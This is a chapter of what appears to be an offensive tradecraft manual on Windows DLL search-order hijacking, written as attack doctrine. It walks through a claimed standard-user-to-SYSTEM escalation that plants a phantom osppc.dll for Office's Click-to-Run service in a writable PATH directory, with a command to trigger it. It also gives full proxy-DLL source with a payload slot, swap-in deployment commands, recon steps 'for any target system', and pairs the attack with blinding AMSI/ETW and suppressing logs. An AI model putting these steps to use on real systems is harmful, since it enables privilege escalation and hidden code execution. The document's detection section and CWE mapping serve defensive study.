# Chapter 45 — DLL Search Order Exploitation

## ASF Tactic: INFILTRATION

**Classification:** Adversarial Survival Framework — Tactical Doctrine
**Author:** George Wu (VADER)
**Prerequisite:** Chapter 15 (Kill Chain), Chapter 13 (Beyond TOCTOU)

---

## Doctrine Statement

CONCEALMENT hides the weapon on disk. COUNTER-INTELLIGENCE blinds the
watchers. **INFILTRATION** gets the weapon inside the fortress walls.

The fundamental principle: you don't need to break the door down if the
guards carry your weapon inside for you. DLL search order exploitation
turns trusted processes into unwitting delivery mechanisms. The process
itself calls LoadLibrary. The PE loader itself walks the search path.
Windows itself resolves the name to your file. You just need to be in
the right directory at the right time.

Every Windows process that loads a DLL is executing a search algorithm.
That algorithm has a fixed order. If you can predict which step the
resolution will reach and control what's waiting there, you own
whatever privilege that process runs with.

This is not a vulnerability in the traditional sense. It's a FEATURE —
the DLL search order exists because applications need to find their
libraries. Microsoft can harden individual paths but cannot eliminate
the search order without breaking every Windows application ever built.
The attack surface is architectural. It doesn't get patched. It gets
mitigated, one DLL at a time, forever.

---

## The DLL Search Order — The 6-Step Waterfall

When a process calls LoadLibrary("something.dll") or the PE loader
resolves an import, Windows doesn't just grab the DLL from one location.
It walks a search path. With SafeDllSearchMode enabled (default since
XP SP2), the order is:

```
┌─────────────────────────────────────────────────────────────────────┐
│                    DLL SEARCH ORDER WATERFALL                       │
│                   (SafeDllSearchMode = ON)                          │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  ┌──────────────────────────────────────┐                           │
│  │ STEP 1: Known DLLs Registry          │ ◄── ~50 DLLs, cached     │
│  │ HKLM\...\KnownDLLs                  │     at boot as section    │
│  │ kernel32, ntdll, user32, etc.        │     objects. NEVER hit    │
│  │                                      │     disk. CANNOT hijack.  │
│  └──────────────┬───────────────────────┘                           │
│         NOT FOUND│                                                   │
│                  ▼                                                   │
│  ┌──────────────────────────────────────┐                           │
│  │ STEP 2: API Set Schema               │ ◄── api-ms-win-*         │
│  │ Kernel-level name resolution         │     ext-ms-win-*          │
│  │ NOT real files on disk               │     Virtual names.        │
│  │                                      │     CANNOT hijack.        │
│  └──────────────┬───────────────────────┘                           │
│         NOT FOUND│                                                   │
│                  ▼                                                   │
│  ┌──────────────────────────────────────┐                           │
│  │ STEP 3: SxS Manifest / Activation   │ ◄── If .exe has a         │
│  │ Context                              │     manifest specifying   │
│  │ Application manifest pins DLL path   │     DLL versions/paths,   │
│  │                                      │     this overrides all.   │
│  └──────────────┬───────────────────────┘                           │
│      NO MANIFEST│ (or DLL not specified in manifest)                │
│                  ▼                                                   │
│  ┌──────────────────────────────────────┐                           │
│  │ STEP 4: Application Directory        │ ◄── Same folder as the   │
│  │ C:\Program Files\App\               │     .exe binary. First    │
│  │                                      │     real disk search.     │
│  └──────────────┬───────────────────────┘                           │
│         NOT FOUND│                                                   │
│                  ▼                                                   │
│  ┌──────────────────────────────────────┐                           │
│  │ STEP 5: System Directories           │ ◄── System32, SysWOW64,  │
│  │ C:\Windows\System32\                │     C:\Windows\           │
│  │ C:\Windows\SysWOW64\               │                           │
│  │ C:\Windows\                         │                           │
│  └──────────────┬───────────────────────┘                           │
│         NOT FOUND│                                                   │
│                  ▼                                                   │
│  ┌──────────────────────────────────────┐                           │
│  │ STEP 6: PATH Directories             │ ◄── Machine + User PATH  │
│  │ Searched in order of appearance      │     entries. If you       │
│  │ First match wins                     │     control ANY of these  │
│  │                                      │     directories: GAME ON  │
│  └──────────────────────────────────────┘                           │
│                                                                     │
│  If not found at step 6: STATUS_DLL_NOT_FOUND                       │
│  Standard import → process crashes                                  │
│  Delay-loaded   → silently continues (EXPLOITABLE)                  │
└─────────────────────────────────────────────────────────────────────┘
```

### Step 1: Known DLLs

Registry key: `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`

About 50 critical system DLLs are cached at boot as section objects in
the kernel object namespace. When LoadLibrary asks for kernel32.dll,
the loader checks the Known DLLs list first, finds a cached section
object, and maps it directly. No disk search ever happens.

```cmd
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs"
```

You CANNOT hijack these. Don't waste time planting kernel32.dll anywhere.
The loader will never find it because it never looks.

### Step 2: API Set Schema

Names like `api-ms-win-core-file-l1-1-0.dll` and `ext-ms-win-kernel32-*`
are not real files. They're virtual names resolved by the API Set Schema
— a kernel-level data structure that maps these names to their actual
implementing DLLs (usually in System32).

If dumpbin shows a service importing `api-ms-win-*`, that's not a DLL
you can plant on disk. The resolution happens before the search order
starts. Ignore these.

### Step 3: SxS Manifest / Activation Context

If the executable has an embedded manifest (or an external .manifest
file) that specifies DLL dependencies with exact versions and paths,
the SxS (Side-by-Side) assembly resolver takes priority. The normal
search order is bypassed for any DLL covered by the manifest.

This is a defence. It's also what killed the DLL sideloading attempt
against NativePushService in the VADER engagement (Finding #40). The
manifest pinned the DLL paths and the proxy DLL in the application
directory was never loaded.

Check for manifests:
```cmd
mt.exe -inputresource:target.exe;#1 -out:manifest.xml
type manifest.xml
```

### Step 4-6: The Attack Surface

Steps 4, 5, and 6 are the real disk search. Application directory first,
then System32/SysWOW64/Windows, then PATH directories in order.

The vulnerability: if a DLL isn't in Known DLLs, isn't an API Set, and
isn't covered by a manifest — it falls through to disk search. If it's
not in the application directory (step 4) and not in System32 (step 5),
it reaches PATH (step 6). And if you control a directory in PATH, you
control what gets loaded.

---

## Phantom DLLs — The osppc.dll Discovery

### What Is a Phantom DLL?

A phantom DLL is a DLL referenced in a binary's import table that
**does not exist anywhere on disk**. The binary was compiled with
headers that declared the DLL, but the DLL was never shipped. The
PE loader searches for it, fails at every step, and — if it's a
standard import — crashes the process.

But if it's **delay-loaded**, the process starts fine. The DLL is
only actually resolved when a specific code path calls one of its
exported functions. If that code path is rare, the service runs
indefinitely without the DLL. But when the path fires — the search
order walks, the DLL isn't found, and if you've planted one, the
loader finds YOURS.

### The Discovery: osppc.dll in OfficeClickToRunSvc

**OfficeClickToRunSvc** (OfficeClickToRun.exe) is a Microsoft
first-party service. Runs as LocalSystem. Auto-starts with Windows.
Manages Office updates, licensing, and Click-to-Run deployment. Present
on every machine with Microsoft Office installed.

Its import table includes **osppc.dll** — the Office Software Protection
Platform Client. Handles licensing validation.

The problem: osppc.dll does not exist on disk. Anywhere.

```cmd
C:\> where /r C:\ osppc.dll
INFO: Could not find files for the given pattern(s).
```

Verification via dumpbin:
```cmd
dumpbin /imports OfficeClickToRun.exe | findstr osppc
```

Not in System32. Not in the Office directory. Not in any SxS assembly
cache. It's a phantom — referenced in the PE but never shipped. The
binary was compiled against the Office SPP SDK headers, the delay-load
pragma was set, and Microsoft never shipped the DLL with the consumer
Office build.

### The Exploitation Flow

```
┌─────────────────────────────────────────────────────────────────┐
│              PHANTOM DLL EXPLOITATION FLOW                      │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  OfficeClickToRunSvc starts as SYSTEM                           │
│            │                                                    │
│            │ (osppc.dll is delay-loaded — service runs fine)     │
│            │                                                    │
│            ▼                                                    │
│  [Service runs normally for hours/days/weeks]                   │
│            │                                                    │
│            │ Office licensing code path triggers                │
│            │ (auto-update, license check, manual trigger)       │
│            │                                                    │
│            ▼                                                    │
│  PE loader resolves osppc.dll import                            │
│            │                                                    │
│            ├── Step 1: Known DLLs? ─────── NO                  │
│            ├── Step 2: API Set? ────────── NO                  │
│            ├── Step 3: Manifest? ──────── NO                   │
│            ├── Step 4: App directory? ──── NO (not there)       │
│            ├── Step 5: System32? ──────── NO (not there)        │
│            ├── Step 6: PATH search...                           │
│            │     ├── C:\Python312\ ──── NO                     │
│            │     ├── C:\tools\bin\ ──── NO                     │
│            │     ├── C:\Users\gwu07\.local\bin\ ──── FOUND!    │
│            │                                                    │
│            ▼                                                    │
│  ┌───────────────────────────────────┐                          │
│  │ YOUR osppc.dll loads into         │                          │
│  │ OfficeClickToRunSvc as SYSTEM     │                          │
│  │                                   │                          │
│  │ DllMain() executes with SYSTEM    │                          │
│  │ privileges. Game over.            │                          │
│  └───────────────────────────────────┘                          │
│                                                                 │
│  Standard user → SYSTEM                                         │
│  No exploit. No memory corruption. No race condition.           │
│  The OS's own loader did the work.                              │
└─────────────────────────────────────────────────────────────────┘
```

### Why This Is High-Severity

1. **First-party service**: ClickToRunSvc is Microsoft's code
2. **First-party search order**: PE loader is Windows itself
3. **Default configuration**: Auto-starts on any Office machine
4. **Standard user to SYSTEM**: No admin required at any step
5. **Persistent**: DLL survives reboots — service restarts, DLL loads again

Combined impact: any machine with Office + a user-writable PATH
directory = local privilege escalation from standard user to SYSTEM,
triggered by normal Office operations.

### Manual Trigger

Don't want to wait for the licensing path to fire naturally:
```cmd
schtasks /Run /TN "\Microsoft\Office\Office Automatic Updates 2.0"
```

This kicks the auto-update scheduled task, which exercises ClickToRunSvc
code paths including the licensing check that delay-loads osppc.dll.

This is CWE-426 (Untrusted Search Path) and Finding #47 in the VADER
engagement log.

---

## PATH Hijacking — Machine-Level

### The Discovery

Standard reconnaissance. Check the PATH:
```cmd
echo %PATH%
```

Machine-level PATH (not user PATH — MACHINE level, applies to every
process on the system) includes:
```
C:\Users\gwu07\.local\bin
```

Check ACLs:
```cmd
icacls C:\Users\gwu07\.local\bin
```

Result: standard user has full control. Read, write, execute, delete.
This directory is inside a user profile — of course the user owns it.

But it's in the **machine PATH**. That means every process on the
system, including SYSTEM services, includes this directory in their DLL
search order at step 6.

Any DLL that falls through Known DLLs, API Set, manifests, app
directory, and System32 — lands in PATH search. And PATH search
includes a directory you fully control.

### How It Gets There

This isn't a Windows bug. It's a pip/pipx/Python artifact.
`pip install --user` adds `~\.local\bin` to PATH so user-installed
Python scripts are available from the command line. Some tools add it
to machine PATH instead of user PATH (or the user does it themselves
during Python setup).

The security gap: a user-writable directory has no business being in
the machine-level PATH. User PATH — fine, it only affects that user's
processes. Machine PATH affects LocalSystem, NetworkService, every
service, every scheduled task. The blast radius is the entire system.

This is CWE-427 (Uncontrolled Search Path Element). The bug isn't in
Windows — it's in whoever added a user-writable directory to the
machine PATH. But the consequence is a system-wide privilege escalation
vector.

### Verification

```cmd
REM Check machine PATH (not user PATH):
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v Path

REM Check if your user has write access:
icacls "C:\Users\gwu07\.local\bin"

REM Plant a canary DLL and see who loads it:
REM (use ProcMon filter: Path contains .local\bin, Operation = CreateFile)
```

---

## DLL Sideloading

### Different From Search Order Hijack

DLL search order hijacking exploits the SEARCH. You're racing the
waterfall — planting a DLL at a step that's reached before the
legitimate DLL is found (or in the case of phantoms, planting at a
step that's reached because the legitimate DLL doesn't exist).

DLL sideloading is different. The application explicitly loads a DLL
from a relative path — typically its own directory. You plant a
malicious DLL alongside the legitimate application, and the application
loads it because it's looking in its own folder.

The distinction matters because the defences are different. Search
order hijacking is mitigated by Known DLLs and manifest pinning.
Sideloading is mitigated by code signing verification and WDAC.

### Real-World: Wondershare NativePushService

From the VADER engagement (Finding #42):

```
Service:     Wondershare NativePushService
Binary:      C:\Users\apacw\AppData\Local\Wondershare\...\WsNativePushService.exe
Runs as:     LocalSystem
ACLs:        Standard user has WRITE access to binary directory
```

A third-party installer dropped a SYSTEM service binary into a user-
writable AppData directory. The service binary itself is replaceable
(CWE-732), and the directory is a valid sideloading target.

### Blocked: Manifest-Directed Search

The sideloading attack against NativePushService was attempted via
VERSION.dll proxy (V5 ECHO). It failed.

Why: the executable has a manifest specifying `dependentAssembly`
entries. With a manifest present, Windows uses manifest-directed DLL
search which skips the application directory for system DLLs. The
proxy DLL in the service directory was never loaded — the loader went
straight to System32's version.dll.

```cmd
REM Extract manifest to check:
mt.exe -inputresource:WsNativePushService.exe;#1 -out:manifest.xml
```

If the manifest contains `<dependentAssembly>` entries for the DLL
you're targeting, sideloading is blocked for that specific DLL. The
binary replacement path (swapping the .exe itself) still works if the
ACLs allow it.

---

## DLL Proxying — The Invisible Replacement

### The Concept

What if the DLL you want to hijack IS loaded from a known location,
and the application will crash without it? You can't just plant a
malicious DLL — the application expects real exports, real function
signatures, real return values.

DLL proxying solves this. You replace the legitimate DLL with yours.
Your DLL forwards ALL original exports to the real DLL (which you've
renamed). Your DllMain runs your payload. Every function call from
the application passes through to the real implementation. The
application sees zero difference in behavior.

```
┌──────────────────────────────────────────────────────────────────┐
│                  DLL PROXY ARCHITECTURE                          │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌──────────────┐    LoadLibrary     ┌───────────────────────┐  │
│  │              │ ──────────────────→ │ YOUR proxy DLL        │  │
│  │  Target.exe  │                    │ (named: helper.dll)    │  │
│  │              │ ◄── returns ────── │                        │  │
│  │  Calls       │    from proxy      │ DllMain():             │  │
│  │  helper.dll  │                    │   1. Run payload       │  │
│  │  functions   │                    │   2. LoadLibrary(      │  │
│  │  normally    │                    │        "helper_real")  │  │
│  │              │                    │   3. Resolve all       │  │
│  └──────────────┘                    │      original exports  │  │
│                                      └───────────┬───────────┘  │
│                                                   │              │
│                                       GetProcAddress for each    │
│                                       exported function          │
│                                                   │              │
│                                                   ▼              │
│                                      ┌───────────────────────┐  │
│                                      │ helper_real.dll        │  │
│                                      │ (renamed original)     │  │
│                                      │                        │  │
│                                      │ All real functions     │  │
│                                      │ intact and working     │  │
│                                      └───────────────────────┘  │
│                                                                  │
│  From Target.exe's perspective: helper.dll works perfectly.      │
│  From your perspective: DllMain ran your payload first.          │
└──────────────────────────────────────────────────────────────────┘
```

### Building a Proxy DLL

Step 1: enumerate the original DLL's exports.

```cmd
dumpbin /exports C:\Windows\System32\version.dll
```

Output gives you every exported function name and ordinal.

Step 2: generate proxy source. For each export, create a forwarding
stub:

```c
// proxy_version.c — forwards all exports to version_real.dll

#include <windows.h>

// Handle to real DLL
static HMODULE hReal = NULL;

BOOL WINAPI DllMain(HINSTANCE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        // Load the real DLL (renamed)
        hReal = LoadLibraryA("version_real.dll");
        if (!hReal) return FALSE;

        // === YOUR PAYLOAD HERE ===
        // Runs as whatever privilege the host process has.
        // CreateThread a worker if you need async execution.
        // Don't block DllMain — the loader lock is held.

        HANDLE hFile = CreateFileA(
            "C:\\Windows\\Temp\\proxy_canary.log",
            GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            char msg[] = "DLL proxy loaded successfully\r\n";
            DWORD written;
            WriteFile(hFile, msg, sizeof(msg)-1, &written, NULL);
            CloseHandle(hFile);
        }
        // === END PAYLOAD ===
    }
    return TRUE;
}

// Forwarding exports — one per original export
// Use #pragma comment(linker, "/export:...") for MSVC:
#pragma comment(linker, "/export:GetFileVersionInfoA=version_real.GetFileVersionInfoA")
#pragma comment(linker, "/export:GetFileVersionInfoW=version_real.GetFileVersionInfoW")
#pragma comment(linker, "/export:GetFileVersionInfoSizeA=version_real.GetFileVersionInfoSizeA")
#pragma comment(linker, "/export:GetFileVersionInfoSizeW=version_real.GetFileVersionInfoSizeW")
#pragma comment(linker, "/export:VerQueryValueA=version_real.VerQueryValueA")
#pragma comment(linker, "/export:VerQueryValueW=version_real.VerQueryValueW")
// ... every export from the original DLL
```

Step 3: deploy.
```cmd
REM Rename the real DLL
ren version.dll version_real.dll

REM Drop your proxy as the original name
copy proxy_version.dll version.dll

REM Application loads version.dll (your proxy)
REM Your proxy loads version_real.dll (the original)
REM All function calls work. Your payload ran first.
```

### Critical DllMain Rules

The loader lock is held during DllMain. You CANNOT:
- Call LoadLibrary for anything other than already-loaded DLLs
  (version_real.dll is OK because you're loading it)
- Wait on threads
- Call COM functions
- Do anything that could deadlock

For payloads that need to do real work: spawn a thread from DllMain,
have the thread wait briefly (Sleep), then execute your payload after
DllMain returns and the loader lock is released.

---

## Identification Methodology — Finding Your Own Phantom DLLs

This is the reconnaissance procedure. Run it on any target system.

### Step 1: ProcMon Filter

Process Monitor (Sysinternals) is the primary tool. Set these filters:

```
Column:    Result
Relation:  is
Value:     NAME NOT FOUND

Column:    Path
Relation:  ends with
Value:     .dll
```

Let ProcMon run. Every process on the system that searches for a DLL
and fails to find it will appear. You'll get noise — hundreds of
entries. Most are benign. Filter further:

```
Column:    User
Relation:  is
Value:     NT AUTHORITY\SYSTEM
```

Now you're only seeing SYSTEM processes that fail to find DLLs.
These are your potential phantom DLLs.

### Step 2: Triage Each Hit

For each phantom DLL candidate:

**Check Known DLLs:**
```cmd
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs" | findstr /i "targetdll"
```
If it's in Known DLLs — move on. Can't hijack it.

**Check API Set:**
Does the DLL name start with `api-ms-win-` or `ext-ms-win-`? If yes
— move on. It's a virtual name.

**Check if delay-loaded:**
```cmd
dumpbin /imports target.exe | findstr /i "delay"
dumpbin /imports target.exe | findstr /i "targetdll"
```
If it's a standard (non-delay-loaded) import and the DLL doesn't
exist, the process would crash. If the process is running fine without
the DLL, it's delay-loaded. Delay-loaded = exploitable (the process
tolerates the DLL's absence until the code path fires).

**Check directory ACLs:**
```cmd
icacls "C:\Path\To\Service\Directory"
```
Can you write to the application directory (step 4 in the waterfall)?
If yes, plant there — it's checked before System32 and PATH.

**Check PATH directories:**
```cmd
echo %PATH%
```
For each PATH directory, check write access:
```cmd
icacls "C:\each\path\entry"
```

**Check service identity:**
```cmd
sc qc ServiceName
```
What user does the service run as? LocalSystem is the jackpot.
NetworkService and LocalService are still escalation but with fewer
privileges. Running as a named user — check if that user has higher
privileges than you.

### Step 3: Verify Exploitability

Plant a canary DLL (not a payload — just a DLL that writes proof of
execution to a temp file). Trigger the code path. Check the canary.
If the canary fires with SYSTEM privileges, you have a confirmed
privilege escalation vector.

```c
// canary.c — minimal proof-of-concept, writes who loaded it
#include <windows.h>
#include <stdio.h>

BOOL WINAPI DllMain(HINSTANCE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        char buf[512];
        char username[128] = {0};
        char modname[MAX_PATH] = {0};
        DWORD ulen = sizeof(username);
        BOOL elevated = FALSE;
        HANDLE token = NULL;

        GetUserNameA(username, &ulen);
        GetModuleFileNameA(NULL, modname, MAX_PATH);

        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
            TOKEN_ELEVATION elev;
            DWORD sz;
            GetTokenInformation(token, TokenElevation, &elev,
                               sizeof(elev), &sz);
            elevated = elev.TokenIsElevated;
            CloseHandle(token);
        }

        snprintf(buf, sizeof(buf),
                 "CANARY|user=%s|elevated=%d|pid=%lu|host=%s\r\n",
                 username, elevated, GetCurrentProcessId(), modname);

        HANDLE hFile = CreateFileA(
            "C:\\Windows\\Temp\\dll_canary.log",
            FILE_APPEND_DATA, FILE_SHARE_READ, NULL,
            OPEN_ALWAYS, 0, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD written;
            WriteFile(hFile, buf, (DWORD)strlen(buf), &written, NULL);
            CloseHandle(hFile);
        }
    }
    return TRUE;
}
```

Compile, plant, trigger, read the log. If `user=SYSTEM` and
`elevated=1` — confirmed.

---

## ASF Integration — The Infiltration Triad

```
┌──────────────────────────────────────────────────────────────────┐
│                    ASF TACTICAL TRIAD                             │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  CONCEALMENT (Ch 43)          COUNTER-INTEL (Ch 44)              │
│  Hide the weapon on disk      Blind the watchers                 │
│         │                            │                           │
│         │     ┌──────────────────────┘                           │
│         │     │                                                  │
│         ▼     ▼                                                  │
│  ┌──────────────────────────────────────┐                        │
│  │          INFILTRATION (Ch 45)        │                        │
│  │     Plant the weapon inside the      │                        │
│  │     fortress walls                   │                        │
│  │                                      │                        │
│  │  The weapon is concealed on disk.    │                        │
│  │  The watchers are blind.             │                        │
│  │  The trusted process does the        │                        │
│  │  loading. You never touch the        │                        │
│  │  fortress door.                      │                        │
│  └──────────────────────────────────────┘                        │
│                                                                  │
│  Execution sequence:                                             │
│    1. CONCEALMENT: ADS, timestomping, naming conventions         │
│    2. COUNTER-INTEL: AMSI/ETW blind, log suppression             │
│    3. INFILTRATION: DLL in search path, service loads it         │
│                                                                  │
│  Each layer makes the next layer harder to detect.               │
│  Concealment without infiltration = weapon nobody finds.         │
│  Infiltration without concealment = weapon everybody sees.       │
│  Both without counter-intel = weapon the watchers catch.         │
│  All three = invisible weapon inside the walls.                  │
└──────────────────────────────────────────────────────────────────┘
```

### The VADER Chain Through This Lens

The TOCTOU exploit (Operation VADER) IS an infiltration technique,
viewed through the right lens:

1. The junction redirects Defender's quarantine write into System32
2. Defender writes a file — YOUR file — into a SYSTEM directory
3. That file is now in the DLL search path at step 5
4. Any process searching for that DLL name finds YOUR version
5. **Defender is the delivery mechanism** — it carried the weapon
   inside the fortress and placed it on the shelf

The TOCTOU race condition is the HOW. Infiltration is the WHAT. The
junction swap tricks a SYSTEM process (Defender) into placing your
code in a location where other SYSTEM processes will load it. It's
DLL hijacking with Defender as the unwitting courier.

The phantom DLL attack (osppc.dll via PATH) is the clean version —
no race condition, no junction, no timing. Just a missing DLL, a
user-writable PATH directory, and a SYSTEM service that eventually
asks the loader to find it.

Different mechanisms. Same doctrinal category. Same result: your code
runs inside a trusted process at SYSTEM privilege because the system's
own resolution mechanisms put it there.

---

## Detection & Countermeasures

Every offensive technique has defences. Understanding them is not
optional — you need to know what will catch you before you decide
whether to proceed.

### WDAC — Windows Defender Application Control

Code Integrity policies that enforce DLL signing requirements. If a
WDAC policy requires all DLLs to be signed by Microsoft (or a specific
publisher), your unsigned proxy/phantom DLL will be blocked at load
time. The PE loader checks the signature before mapping the DLL.

**Strength:** Kills all unsigned DLL hijacking dead. No exceptions.
**Weakness:** Rarely deployed. Enterprise-only. Breaks third-party
software that ships unsigned DLLs (which is most of it). Very few
organizations run WDAC in enforce mode.

### Sysmon Event 7 — ImageLoaded

Sysmon logs every DLL load with:
- Full path of the loaded DLL
- Signature status (signed/unsigned/invalid)
- Hash
- Process that loaded it

A SOC analyst looking at Event 7 will see:
```
ImageLoaded: C:\Users\gwu07\.local\bin\osppc.dll
Signed:      FALSE
Process:     OfficeClickToRun.exe (PID: 4832, SYSTEM)
```

An unsigned DLL loaded by a Microsoft service from a user directory.
That's a screaming alert if anyone's watching.

**Strength:** Full visibility into DLL loads.
**Weakness:** Generates enormous volumes. Most organizations don't
monitor Event 7 at scale. The signal drowns in noise unless you
have detection rules specifically looking for unsigned DLLs in
SYSTEM processes loaded from non-standard paths.

### Application Manifest Pinning

As demonstrated by the NativePushService finding — an application
manifest with `dependentAssembly` entries for system DLLs prevents
sideloading by directing the loader to resolve those DLLs from their
SxS assembly location rather than the normal search order.

**Strength:** Per-application, precise, doesn't break anything.
**Weakness:** Doesn't protect against phantom DLLs (the phantom isn't
in the manifest because the developer didn't know it was imported).
Doesn't protect against PATH hijacking (only covers DLLs explicitly
listed in the manifest).

### Known DLLs Expansion

Microsoft could add more DLLs to the Known DLLs registry key. Every
DLL in that list is permanently immune to search order hijacking.
They've done this incrementally over Windows versions.

**Strength:** Permanent fix for specific DLLs.
**Weakness:** Can't add every DLL. Third-party DLLs can't be in
Known DLLs. Application-specific DLLs can't be in Known DLLs.
The list grows but the attack surface grows faster as more software
ships more DLLs.

### The Fundamental Gap

The DLL search order is a **feature**. Applications depend on it.
Removing it breaks backward compatibility with every Windows
application ever built. Microsoft can:

- Harden specific DLLs (Known DLLs list)
- Harden specific applications (manifests)
- Enforce signing (WDAC, rarely deployed)
- Log loads (Sysmon, rarely monitored for DLL loads)

They cannot eliminate the search order. The 6-step waterfall is baked
into the PE loader. It exists because applications need to find their
libraries, and different applications need the flexibility to override
system DLLs with local versions (step 4 takes priority over step 5).

This means DLL search order exploitation is not a vulnerability class
that gets patched. It's a permanent feature of the Windows architecture
that gets mitigated, one DLL at a time, forever. Every new application
that ships with a delay-loaded import to a non-existent DLL reopens
the attack surface.

The attacker needs to find ONE phantom DLL in ONE SYSTEM service with
ONE writable directory in the search path. The defender needs to
protect ALL DLLs in ALL services against ALL writable directories.
Asymmetric advantage: attacker.

---

## Quick Reference — CWE Mapping

```
TECHNIQUE                   CWE      DESCRIPTION
───────────────────────────────────────────────────────────────
Search order hijack         CWE-426  Untrusted Search Path
PATH directory control      CWE-427  Uncontrolled Search Path Element
Service binary replacement  CWE-732  Incorrect Permission Assignment
Phantom DLL planting        CWE-426  Untrusted Search Path
DLL sideloading             CWE-426  Untrusted Search Path
DLL proxying                CWE-426  Untrusted Search Path
```

---

## Chapter Summary

DLL search order exploitation is not one technique — it's a family.
Phantom DLLs, PATH hijacking, sideloading, proxying — different
mechanisms, same doctrinal category. You don't break the door. You
put your weapon where the guards will pick it up and carry it inside.

The 6-step waterfall is the map. Known DLLs and API Sets are the
walls you can't climb. Steps 4 through 6 are the unlocked gates.
Phantom DLLs are the gates that aren't even guarded because nobody
knew they were there.

INFILTRATION completes the ASF triad. CONCEALMENT hides the weapon.
COUNTER-INTELLIGENCE blinds the watchers. INFILTRATION places the
weapon inside the perimeter. All three operating together: invisible
code running inside a trusted process at maximum privilege, with no
alert generated, no memory corruption required, and no trace in the
standard event logs.

The OS did the loading. The service did the executing. You just left
something in the right place at the right time.
